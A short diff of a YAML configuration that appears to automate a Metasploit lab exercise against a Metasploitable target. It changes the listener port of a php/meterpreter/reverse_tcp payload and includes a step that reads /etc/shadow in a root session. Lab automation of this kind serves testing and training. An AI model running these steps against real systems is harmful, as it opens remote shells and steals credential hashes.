@@ -17,7 +17,7 @@ vars:
   METASPLOITABLE: 172.17.0.106
   ATTACKER: 172.17.0.127
   PAYLOAD: php/meterpreter/reverse_tcp
-  LPORT: 4444
+  LPORT: 4410
 
 commands:
   - type: mktemp
@@ -89,4 +89,3 @@ commands:
   - type: msf-session
     cmd: cat /etc/shadow
     session: root
-
